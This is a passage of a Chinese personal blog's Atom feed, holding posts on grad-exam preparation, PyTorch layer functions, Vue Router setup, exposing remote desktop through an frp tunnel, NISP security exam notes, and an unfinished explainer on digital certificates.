title="政治"></a>政治</h1><p>政治别听别人说是直接9月开始什么的，其实暑假就可以开始听了。不然你在后期反而要花很多时间去听政治基础课，理解那些很绕脑的概念。可以在暑假期间当做解闷的内容之一，复习完数学部分或者是专业课部分就听听政治，算是换换脑子。</p><p>我也是从暑假开始的听政治课的，那个时候也就是看看视频，大概对考研政治中要考什么内容做一个了解，搭建一个框架。我是直接先听的徐涛老师的课，很有意思，像是在听相声一样。前期知识没听多少，徐涛老师的生活习惯倒是听得不少。</p><p>暑假期间把马原部分全部听完之后听了听近纲的部分知识。这时候就差不多快9月了，后面毛概和思修内容就都是听腿姐的冲刺班了（冲刺班好像是10月开始的？），然后就是刷刷卷子了。肖1000可以做做，算是巩固知识点。</p><p>政治的卷子就不能用真题了，毕竟每年变换一个样子。基本还是做模拟卷的比较多，像是腿姐四套卷之类的。腿姐的冲刺班会列出一些题，做做还是可以的。然后12月肖四肖八出来了就狂背肖四肖八。我当初只背了肖四前三套，结果考了第四套的一些题，直接给我弄无语了。</p><h1 id="专业课"><a href="#专业课" class="headerlink" title="专业课"></a>专业课</h1><p>专业课部分我付出的时间可能相对来说不是很多，但是它的内容其实是最多的。川大的专业课是自命题，和408还是有很大的区别。我的建议是多去找找川大本科的期末考试题，有些题就是期末考试接近原题的题目，自命题考试可能或多或少都有点这种感觉吧。</p><p>专业课的开始也是在暑假期间，当时计网和操作系统都是使用的王道系列的教材。听听课，做做课后题。这两本书的课后题选择题部分我都做了，然后是大题部分我只做了标有408原题的题目。后期开始去看黑书的内容，黑书很经典所以其实872的出题是较为偏向黑书的。</p><p>同时也可以在网上找一些川大毕业的学长学姐，或者去找找比较正规的那种考研机构的一对一辅导，别人给你期末考试资料同时还可以给你勾画重点呢（我没去过我也不知道，不过附近有人去参加相应辅导的）</p><p>川大872的三个科目中，信安科目是涉及安全知识的，它的知识面很广很杂，并且难度很高，但是分值只有30分。从性价比方面来看完全不如同样是30分的操作系统。建议可以把这30分复习信安的时间放在操作系统和计网上。操作系统看王道就好，计网的话还是多看看黑书吧，从暑假开始看黑书，也可以用王道的视频看，只是知识点有点不一样。872考得要比408计网更难，知识点更细。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一年多的时间总的来说，其实也谈不上有多少波折。就是按部就班，平平常常地学习和学习。当然其中也不乏有着玩耍的时间，劳逸结合还是最重要的。在这里尤其感谢我的女朋友，和她一起出去玩之后回来进入学习状态的时间反而还变快了。果然也不能一直待在书本待在电脑前埋头苦干，觉得累了适当出去散散步，松松自己紧绷的弦。（当然也不能太频繁出去玩了）</p><p>你要对自己的学习进度有个明确的认知，知道自己在这个学科中是否达到了让你玩玩也可以安心的阶段。当然这个属于是“说起容易做起难”，学习进度这个事情除了自己本人以外，很少有人可以知道什么时候该学到什么地方。不过需要有太大的压力，进入学习状态的时候自然而然就会想着学习，不会想着其他事了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 23考研结束其实有一段时间了，不过毕业设计耗费了我大多数精力，所以直到现在才开始进行考研的经验复盘（其实也是太懒了）我考的是四川大学网安专硕，数二英二，在今年的考研初试科目中难度还是算简单的。&lt;/p&gt;
&lt;p&gt;总分是388，其中数学114，英语83，政治70以及专业课121</summary>
      
    
    
    
    
    <category term="学习经验" scheme="https://thanyi.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>神经网络相关名称总结</title>
    <link href="https://thanyi.github.io/2023/04/22/027-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E5%90%8D%E7%A7%B0%E6%80%BB%E7%BB%93/"/>
    <id>https://thanyi.github.io/2023/04/22/027-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E5%90%8D%E7%A7%B0%E6%80%BB%E7%BB%93/</id>
    <published>2023-04-22T02:03:10.000Z</published>
    <updated>2023-04-22T03:09:57.116Z</updated>
    
    <content type="html"><![CDATA[<p>有些时候在跑神经网络模型的时候发现有很多专业名词和函数老是记不清，所以想在这里整理一下，方便归纳。</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="BatchNorm2d-函数"><a href="#BatchNorm2d-函数" class="headerlink" title="BatchNorm2d()函数"></a>BatchNorm2d()函数</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>BatchNorm2d归一化，就是指使用BatchNorm2d函数来进行</p><p>它的目的是使得数据在进行Relu之前不会因为数据过大而导致网络性能的不稳定</p><h3 id="位置和使用"><a href="#位置和使用" class="headerlink" title="位置和使用"></a>位置和使用</h3><p>在神经网络中每一次卷积基本都包含了3个步骤：</p><ul><li>conv卷积层</li><li>BatchNorm2d归一化</li><li>ReLU或者其他激活函数</li></ul><p>其中卷积就是直接卷积，大家应该都知道</p><p>BatchNorm2d()函数数学原理如下：</p><img src="/2023/04/22/027-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E5%90%8D%E7%A7%B0%E6%80%BB%E7%BB%93/3ebc499e84ea46249245af39d907e612.png" class title="在这里插入图片描述"><p>在pytorch中的函数原型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.nn.BatchNorm2d(num_features, eps&#x3D;1e-05, momentum&#x3D;0.1, affine&#x3D;True)</span><br></pre></td></tr></table></figure><p>其中的参数是:</p><p>1.<code>num_features</code>：一般输入参数为输入数据的特征通道数，也就是一个 [batch_size, in_channels, height, width]中的in_channels张量，即为其中特征的数量，</p><p>2.<code>eps</code>：分母中添加的一个值，目的是为了计算的稳定性，默认为：1e-5</p><p>3.<code>momentum</code>：一个用于运行过程中均值和方差的一个估计参数（就是一个惯性吧应该）</p><p>4.<code>affine</code>：当设为true时，会给定可以学习的系数矩阵gamma和beta</p><h2 id="Dropout函数"><a href="#Dropout函数" class="headerlink" title="Dropout函数"></a>Dropout函数</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>Dropout 能够避免过拟合，我们往往会在全连接层这类参数比较多的层中使用dropout</p><p>在训练包含Dropout层的神经网络中，每个批次的训练数据都是随机选择，实质是训练了多个子神经网络。</p><p>因为在不同的子网络中随机忽略的权重的位置不同，最后在测试的过程中，将这些小的子网络组合起来，类似一种投票的机制来作预测，有点类似于集成学习的感觉。</p><h3 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h3><p>一般就放在全连接层前面，用来随机简化一下全连接层，降低一下GPU的压力</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>在pytorch中有<code>nn.Dropout</code>和<code>nn.functional.dropout</code>两种。</p><p>推荐使用<code>nn.Dropout</code>，因为一般情况下只有训练train时才用dropout，在eval不需要dropout。</p><p>使用<code>nn.Dropout</code>，在调用<code>model.eval()</code>后，模型的Dropout层和批归一化（batchnorm）都关闭，但用<code>nn.functional.dropout</code>，在没有设置training模式下调用<code>model.eval()</code>后不会关闭Dropout。</p><p>这里关闭Dropout等的目的是为了测试我们训练好的网络。</p><p>在eval模式下，Dropout层会让所有的激活单元都通过，而batchnorm层会停止计算和更新mean和var，直接使用在train训练阶段已经学出的mean和var值。</p><h2 id="with-torch-no-grad"><a href="#with-torch-no-grad" class="headerlink" title="with torch.no_grad()"></a>with torch.no_grad()</h2><p>停止掉autograd模块的工作，意思是这个时候就不会计算梯度和进行优化了，也不会储存梯度，一般就是验证和测试的时候用</p><h2 id="model-eval"><a href="#model-eval" class="headerlink" title="model.eval()"></a>model.eval()</h2><ul><li>对于BatchNorm，model.eval()是保证BN层能够用全部训练数据的均值和方差，即测试过程中要保证BN层的均值和方差不变。</li><li>对于Dropout，model.eval()是利用到了所有网络连接，即不进行随机舍弃神经元。</li></ul><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="csdn%E5%8D%9A%E5%AE%A2">https://blog.csdn.net/qq_42346574/article/details/119895908</a>.<br><a href="https://www.csdn.net/">https://www.bilibili.com/video/BV1DM4y1w7J4</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;有些时候在跑神经网络模型的时候发现有很多专业名词和函数老是记不清，所以想在这里整理一下，方便归纳。&lt;/p&gt;
&lt;h1 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;&lt;/a&gt;函数&lt;/h1&gt;&lt;h2 id=&quot;BatchNor</summary>
      
    
    
    
    
    <category term="神经网络" scheme="https://thanyi.github.io/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>关于vue路由和Django的路由问题</title>
    <link href="https://thanyi.github.io/2023/04/20/026-%E5%85%B3%E4%BA%8Evue%E8%B7%AF%E7%94%B1%E5%92%8CDjango%E7%9A%84%E8%B7%AF%E7%94%B1%E9%97%AE%E9%A2%98/"/>
    <id>https://thanyi.github.io/2023/04/20/026-%E5%85%B3%E4%BA%8Evue%E8%B7%AF%E7%94%B1%E5%92%8CDjango%E7%9A%84%E8%B7%AF%E7%94%B1%E9%97%AE%E9%A2%98/</id>
    <published>2023-04-20T15:08:15.000Z</published>
    <updated>2023-04-22T02:50:29.444Z</updated>
    
    <content type="html"><![CDATA[<p>总所周知，vue框架是一种非常非常简单的框架，对于路由的问题更是这样的，同时其实Django的框架中也有关于路由的实现（不如说路由才是最主要的问题之一）。Vue对于路由的实现是通过<code>vue.router</code>来实现的。而Django直接有个<code>url.py</code>文件来实现对于url路由的解决。</p><p>我的毕设是用了Vue+Django用作前后端分离进行的，所以真的是思考了很久关于这个路由到底是用哪边比较好比较方便，最终还是使用了Vue自带的<code>vue.router</code>，只是将Django框架作为了api的接口使用，通过几个路由进行文件的转接和使用。</p><h1 id="router的安装和使用"><a href="#router的安装和使用" class="headerlink" title="router的安装和使用"></a>router的安装和使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这个很简单，在npm中直接安装就好</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-router</span><br></pre></td></tr></table></figure><p>如果是用的vue3（比如我）那就直接用4.x版本的vue</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-router@4</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>安装好之后直接在vue框架中的建立一个<code>router</code>文件夹，里面创建<code>index.js</code>（这个主要是就方便导入，import的时候导入<code>index.js</code>可以直接导入上级的文件夹。</p><p>使用的话，首先在在你的<code>index.js</code>中，引用<code>router</code>模块的两个函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span>;</span><br></pre></td></tr></table></figure><p>ES6中对于多个函数或者模块的导出使用<code>&#123;&#125;</code>进行导出的，同时用 <code>&#39;&#39;</code>或者<code>&quot;&quot;</code>来表示模块</p><p>其次进行history和routes的创建</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> history = createWebHistory();</span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">      component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;@/views/MyHome&quot;</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">&quot;/results&quot;</span>,</span><br><span class="line">      component: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;@/views/HelloWorld&quot;</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">  ];</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> createRouter(&#123;</span><br><span class="line">  history,</span><br><span class="line">  routes</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个是<code>history</code>，一个是<code>routes</code></p><p><code>createWebHistory()</code> 是 Vue Router 4 中用于创建路由历史记录对象的函数，返回一个历史记录对象。该函数主要用于在浏览器中使用 HTML5 History API 来管理路由，从而实现前端路由。</p><p>不过我目前还没有知道这个<code>history</code>有个什么用，后期再补充吧</p><p>对于<code>routes</code>，这个也就是一个对象列表，参数可以很明显的看出来就不细说了，也就是注意其实可以直接对<code>component</code>使用我们已经有过的vue组件，只是说你需要引用</p><p>格式如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> HelloWorld <span class="keyword">from</span> <span class="string">&#x27;@/components/HelloWorld.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">&quot;/results&quot;</span>,</span><br><span class="line">      component: HelloWorld,</span><br><span class="line">    &#125;,</span><br><span class="line">  ];</span><br></pre></td></tr></table></figure><p>最后进行导出</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br></pre></td></tr></table></figure><p>框架的<code>App.vue</code>文件中进行导入操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&quot;@/router&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = createApp(App)</span><br><span class="line">app.use(router)</span><br><span class="line"></span><br><span class="line">app.mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><p>其中@号代表的是项目根目录</p><p>最后的最后，需要注意的是，要把需要展示的内容，放在标签<code>&lt;router-view&gt;&lt;/router-view&gt;</code>中，我是喜欢直接放在<code>App.vue</code>中。</p><h1 id="Vue在上传视频后进行页面跳转"><a href="#Vue在上传视频后进行页面跳转" class="headerlink" title="Vue在上传视频后进行页面跳转"></a>Vue在上传视频后进行页面跳转</h1><p>这个是最主要的在系统中实现需要的功能，也就是上传视频后直接跳往想要的界面</p><p>在vue中有专门做这个功能的模块</p><p>对我来说，因为我的需求是上传文件到后端，同时为了美观使用了<code>element-ui</code>作为前端的参考，所以我的上传地方是这样的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-upload</span><br><span class="line">     <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;upload-demo&quot;</span></span><br><span class="line">     drag</span><br><span class="line">     name=<span class="string">&quot;file&quot;</span></span><br><span class="line">     action=<span class="string">&quot;http://127.0.0.1:8000/api/upload&quot;</span></span><br><span class="line">     :on-success=<span class="string">&quot;handleUploadSuccess&quot;</span></span><br><span class="line">     multiple</span><br><span class="line">  &gt;</span><br></pre></td></tr></table></figure><p>注意的是<code>:on-success</code>是监控属性，也就是对属性的监控，这个属性是在element-ui的文档中有的</p><img src="/2023/04/20/026-%E5%85%B3%E4%BA%8Evue%E8%B7%AF%E7%94%B1%E5%92%8CDjango%E7%9A%84%E8%B7%AF%E7%94%B1%E9%97%AE%E9%A2%98/image-20230421123302895.png" class title="image-20230421123302895"><p>注意<code>@</code>是绑定DOM事件，<code>:</code>是绑定属性，属性在文档看就行</p><p>然后在<code>script</code>中编辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">    <span class="function"><span class="title">handleUploadSuccess</span>(<span class="params">response, file, fileList</span>)</span> &#123;</span><br><span class="line">      <span class="comment">// 在这里处理上传成功后的逻辑，例如路由跳转</span></span><br><span class="line">        <span class="built_in">this</span>.$router.push(<span class="string">&#x27;/results&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p><code>this</code>表示的是这个本组件对象，而<code>$router</code> 是一个指向当前应用程序的 Vue Router 实例的属性，vue单独为一些内置属性和方法开了空间，用<code>$</code>加一命名</p><p>而后就直接跳转就好了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;总所周知，vue框架是一种非常非常简单的框架，对于路由的问题更是这样的，同时其实Django的框架中也有关于路由的实现（不如说路由才是最主要的问题之一）。Vue对于路由的实现是通过&lt;code&gt;vue.router&lt;/code&gt;来实现的。而Django直接有个&lt;code&gt;ur</summary>
      
    
    
    
    
    <category term="前端" scheme="https://thanyi.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>Frp内网穿透实现远程桌面</title>
    <link href="https://thanyi.github.io/2022/04/09/023frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"/>
    <id>https://thanyi.github.io/2022/04/09/023frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/</id>
    <published>2022-04-09T01:59:21.000Z</published>
    <updated>2022-05-19T12:04:01.532Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近换了一个小电脑（也不是换了一个电脑，是终于把我的电脑系统换回windows了呜呜呜呜，windows真好我想说）</p><p>然后就想要把我的大电脑就放在宿舍用了，平时用小电脑出门就好了，于是在v2ex网站上找到了这个方法：</p><p>公网服务器 + frp内网穿透</p><h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><ul><li>一台vps服务器：这里我用的是腾讯云轻量，理论上来说只要一个有公网ip的服务器就好了</li><li>frp应用包：从github下载：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></li><li>一点linux知识</li></ul><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>首先我们进行对github包的下载：</p><img src="/2022/04/09/023frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20220409101200243.png" class title="image-20220409101200243"><p>当然如果你是用linux连接linux那当我没说</p><p>一般的腾讯云都是x64结构的</p><p>下载下来的包都是有客户端和服务端的部分</p><blockquote><ul><li>“frps”、”frps_full.ini”、”frps.ini”是放在服务器端运行的可执行文件和配置文件。</li><li>“frpc”、”frpc_full.ini”、”frpc.ini”是放在客户端端运行的可执行文件和配置文件。</li></ul></blockquote><h2 id="服务器端配置"><a href="#服务器端配置" class="headerlink" title="服务器端配置"></a>服务器端配置</h2><p>进入服务器对我们下载的包进行解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf &lt;压缩包名字&gt;</span><br></pre></td></tr></table></figure><p>如果你不知道压缩包该放哪可以放在/opt 路径下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv &lt;压缩包名字&gt; /opt</span><br></pre></td></tr></table></figure><p>然后我们进行配置：对frps.ini 进行修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">token &#x3D; 12310086</span><br><span class="line"></span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line">dashboard_user &#x3D; admin</span><br><span class="line">dashboard_pwd &#x3D; admin123</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>bind_addr是我们表示服务器允许从任何ip来的请求</li><li>bind_port是规定端口</li><li>token是可以当做服务器的连接密钥，需要这个东西</li><li>剩下的dashboard相关的是面板展示，可有可无</li></ul><p>修改好了直接运行frps执行文件就好了</p><p>如果你想将它放在后台，那建议你使用nohup命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./frps -c ./frps.ini &amp;</span><br></pre></td></tr></table></figure><h2 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h2><p>同理，下载github后进行配置</p><p>对frpc.ini 进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; &lt;服务器ip&gt;</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token&#x3D;12310086</span><br><span class="line"></span><br><span class="line">[RDP]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 33389</span><br></pre></td></tr></table></figure><p>然后运行这个程序</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure><p>后面如果有success就是成功了</p><blockquote><p>注意：一定要在这个时候进行服务器的防火墙设置</p></blockquote><h1 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h1><p>在客户端进行使用的时候是这样的：</p><img src="/2022/04/09/023frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20220414121931052.png" class title="image-20220414121931052"><p>ip就是我们自己的服务器的公网ip</p><blockquote><p>记得在被控制端的电脑上进行设置，并且只有windows专业版的电脑才可以设置！</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近换了一个小电脑（也不是换了一个电脑，是终于把我的电脑系统换回windows了呜呜呜呜，windows真好我想说）&lt;/p&gt;
&lt;p&gt;然后就想</summary>
      
    
    
    
    <category term="技术" scheme="https://thanyi.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="技术" scheme="https://thanyi.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
    <category term="frp" scheme="https://thanyi.github.io/tags/frp/"/>
    
  </entry>
  
  <entry>
    <title>nisp-错题回顾（二）</title>
    <link href="https://thanyi.github.io/2022/03/25/022nisp-%E9%94%99%E9%A2%98%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://thanyi.github.io/2022/03/25/022nisp-%E9%94%99%E9%A2%98%E5%9B%9E%E9%A1%BE%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2022-03-25T02:05:15.000Z</published>
    <updated>2022-05-02T15:59:47.388Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PGP"><a href="#PGP" class="headerlink" title="PGP"></a>PGP</h3><p>PGP是一个免费的个人编写的密码软件</p><p>全称是Pretty Good Privacy，它采用了一种RSA和传统加密结合的机制</p><h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h3><p>阶段有六点：</p><p>准备、检测、遏制、根除、恢复、跟踪总结</p><h3 id="黑客获取口令的方式"><a href="#黑客获取口令的方式" class="headerlink" title="黑客获取口令的方式"></a>黑客获取口令的方式</h3><ul><li>暴力破解</li><li>键盘记录木马</li><li>屏幕快照密码</li></ul><h3 id="储存管理"><a href="#储存管理" class="headerlink" title="储存管理"></a>储存管理</h3><p>主要任务：</p><ul><li>对内存进行分配、保护和扩充</li><li>为多道程序运行提供有力支撑</li><li>便于用户储存，提高储存空间利用率</li></ul><h3 id="无线路由器的三种上网方式"><a href="#无线路由器的三种上网方式" class="headerlink" title="无线路由器的三种上网方式"></a>无线路由器的三种上网方式</h3><p>PPPoE、动态IP、静态IP</p><h3 id="信息安全的三个支柱"><a href="#信息安全的三个支柱" class="headerlink" title="信息安全的三个支柱"></a>信息安全的三个支柱</h3><p>技术、法律法规、管理</p><h3 id="信息安全事件划分"><a href="#信息安全事件划分" class="headerlink" title="信息安全事件划分"></a>信息安全事件划分</h3><p>特别重大事件、重大事件、较大事件和一般事件</p><h3 id="密码学的目的"><a href="#密码学的目的" class="headerlink" title="密码学的目的"></a>密码学的目的</h3><p>研究数据保密</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;PGP&quot;&gt;&lt;a href=&quot;#PGP&quot; class=&quot;headerlink&quot; title=&quot;PGP&quot;&gt;&lt;/a&gt;PGP&lt;/h3&gt;&lt;p&gt;PGP是一个免费的个人编写的密码软件&lt;/p&gt;
&lt;p&gt;全称是Pretty Good Privacy，它采用了一种RSA和传统加密结合的</summary>
      
    
    
    
    <category term="学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="nisp" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/nisp/"/>
    
    
    <category term="nisp" scheme="https://thanyi.github.io/tags/nisp/"/>
    
  </entry>
  
  <entry>
    <title>关于数字证书</title>
    <link href="https://thanyi.github.io/2022/03/24/021%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/"/>
    <id>https://thanyi.github.io/2022/03/24/021%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/</id>
    <published>2022-03-24T11:44:57.000Z</published>
    <updated>2022-05-02T16:02:17.242Z</updated>
    
    <content type="html"><![CDATA[<p>数字证书真的是让我从学习密码学开始就一直没弄懂过，非常的痛苦，因为它是个套娃理论。我的脑子又是真的对于套娃非常地接受不了。所以说还是写一些东西进行弥补一下。这篇文章就按我自己的理论来写了。</p><p>当你在网络环境中时，面对着和别的电脑的交流，特别是和可信任的电脑交流的时候，你最需要的就是一个证明，证明什么？</p><p><strong>证明你是你自己！</strong></p><p>怎么证明呢？这里就是数字证书出场的时候。</p><p>但是在数字证书之前，我们要首先要学习几个名称</p><h3 id="PKI"><a href="#PKI" class="headerlink" title="PKI"></a>PKI</h3><p>Public Key Infrastructure（PKI)，中文叫做<strong>公开密钥基础设施</strong>。</p><p>这个PKI，说是一个公开密钥基础设施，但其实是泛指了这一种类型的机制。</p><p>我们之后所说的所有的与数字证书相关的各种概念和技术，都统称为PKI</p><h3 id="CA机构"><a href="#CA机构" class="headerlink" title="CA机构"></a>CA机构</h3><p>Certificate Authority (CA) 机构，是一个权威部门，具有可相信的特性的第三方，我们所有的电脑都信任这个第三方。</p><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>数字签名是一个使用自己的签名的方法。</p><p>使用只有我们自己知道的私钥（我假定你已经知道了什么是公钥，什么是私钥）</p><p>我这里有一个文件，比如说是 security.txt，以下是ethanyi（我）进行数字签名的步骤</p><ol><li>计算这个security. txt 文件的Hash值（Hash值是一个固定长度的字符串）</li><li>通过ethanyi的私钥对其进行加密，得到的就是我的数字签名</li></ol><img src="/2022/03/24/021%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/image-20220324201400678.png" class title="image-20220324201400678"><h2 id="数字证书流程"><a href="#数字证书流程" class="headerlink" title="数字证书流程"></a>数字证书流程</h2><p>回到刚才的问题，数字证书帮我们进行了证明，证明我们自己的身份。</p><p>那么数字证书里面有什么呢？假如我叫ethanyi，这个证书是我的，那么它就有以下几个部分：</p><ul><li>ethanyi的公钥数据</li><li>ethanyi的身份信息</li><li>CA机构的数字签名</li></ul><img src="/2022/03/24/021%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/image-20220324202826006.png" class 